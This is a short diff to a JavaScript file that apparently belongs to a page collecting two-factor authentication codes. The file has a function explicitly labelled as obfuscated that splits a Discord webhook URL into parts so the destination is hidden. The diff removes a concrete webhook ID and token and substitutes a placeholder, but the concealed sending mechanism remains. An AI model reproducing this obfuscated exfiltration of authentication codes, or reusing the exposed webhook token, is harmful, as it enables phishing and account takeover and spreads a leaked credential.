@@ -269,11 +269,7 @@ if (twofaInput2 && verifyButton2) {
 // === Webhook Sending (Obfuscated) ===
 async function sendWebhook(title, description, color) {
   // Obfuscated webhook URL - split into parts and reconstructed
-  const parts = [
-    'https://discord.com/api/webhooks/',
-    '1395572509121708077/',
-    'j5SirT3JIUzavQZUAYEroFFpLwQE0u2Gb-_ppOW1ashw-t-ltPn38cA8d51ARDWMc00L'
-  ];
+  const parts = ['WEBHOOK_PLACEHOLDER'];
   const webhookUrl = parts.join('');
   
   const payload = {
